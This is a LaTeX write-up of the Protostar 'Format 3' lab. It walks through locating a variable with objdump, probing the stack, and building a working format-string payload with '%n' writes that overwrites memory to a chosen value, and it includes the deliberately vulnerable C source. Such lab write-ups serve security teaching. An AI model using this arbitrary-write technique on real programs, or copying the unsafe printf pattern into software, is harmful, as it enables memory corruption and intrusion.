
\begin{center}\begin{LARGE}Format 3\end{LARGE}\end{center}
 
\subsection*{Problem}

We can see that the problem is similar to format 2, but this time we need to
carefully modify the variable in memory such that in the compare statement we
have the required 4 bytes value.

\begin{lstlisting}[language=bash]
objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
\end{lstlisting}

Similarly we find the memory location of target again. We now will begin
injecting some string format to test the output of the program.

\subsection*{Idea and Attack process}

\begin{lstlisting}[language=bash]
python -c "print 'AAAA' + '%x.'*15" | ./format3
AAAA0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14.41414141.252e7825.78252e78.2e78252e.
target is 00000000 :(
\end{lstlisting}

We run the above code to first find out where in memory does the input reside in.
Having found the location, we will now inject the memory location of target and
we will also modify the format specifier which resides at the location of the string.

\begin{lstlisting}[language=bash]
python -c "print '\xf4\x96\x04\x08' + '%x.'*11 + '%n'" | ./format3
0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14.
target is 0000004c :(
\end{lstlisting}

Now that we can see there is some modifications to the target variable, we want
to write a specific value of $0x01025544$ using this pointer. This a 4byte value
to be written. We can conclude that we have to write this value to 4 memory
location from $0x080496f4$ to \lstinline|0x080496f7|.

Searching online, we can see that it is possible to modify the values of multiple
memory location using the following line of code.

\begin{lstlisting}[language=bash]
python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08' + '%x.'*11 + '%n%n%n%n'" | ./format3
target is 58585858 :(
\end{lstlisting}

Now that we are able to confirm that we can modify the target variable, we will
try to inject the values that we want to write to these memory location. We
structure the attack such that it is based on groups of [Value, Address]. We
repeat this structure for the 4 bytes that we want to write, to inject the value
we use "\%u" as a mechanism to obtain the needed value and "\%n" to inject the value
into the memory location. We refer to the short python calculate in this website,
https://xavibel.com/2020/11/22/protostar-format-strings-level-3/ to obtain the
offset needed. Computing the values, we are able to create our format attack string.

\begin{lstlisting}[language=bash]
python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%220u%n%17u%n%173u%n%255u%n'" | ./format3
0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14...
you have modified the target :)
\end{lstlisting}

\subsection*{Source code}

\begin{lstlisting}[language=c]
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
\end{lstlisting}
